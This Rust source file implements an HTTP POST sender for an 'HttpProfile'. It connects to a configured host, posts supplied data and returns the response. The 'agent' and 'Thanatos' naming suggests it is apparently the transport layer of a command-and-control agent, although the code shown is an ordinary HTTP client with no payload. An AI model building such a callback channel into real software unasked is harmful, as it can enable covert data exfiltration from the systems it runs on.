use crate::http::HttpProfile;
use std::io::Write;
use std::net::TcpStream;

use agent_utils::debug_invoke;
use agent_utils::errors::{ProfileInternalError, ThanatosError};

use super::{HttpRequest, HttpResponse, HttpVerb};

impl HttpProfile {
    /// Sends and HTTP POST request the with supplied data and returns the result
    pub fn send_http(&mut self, data: &str) -> Result<String, ThanatosError> {
        let connection = format!("{}:{}", self.host.trim_start_matches("http://"), self.port);

        let mut stream = debug_invoke!(
            TcpStream::connect(connection),
            ThanatosError::ProfileError(ProfileInternalError::NoConnection)
        );

        let req = HttpRequest::new(
            HttpVerb::POST,
            self.host.as_str(),
            config::http::get_post_uri(),
            &self.headers,
            Some(data),
        )
        .serialize();

        debug_invoke!(
            stream.write_all(&req),
            ThanatosError::ProfileError(ProfileInternalError::Fatal)
        );

        let res = HttpResponse::from_reader(stream).map_err(|e| ThanatosError::ProfileError(e))?;

        if res.status != 200 {
            return Err(ThanatosError::ProfileError(ProfileInternalError::Fatal));
        }

        Ok(res.data)
    }
}
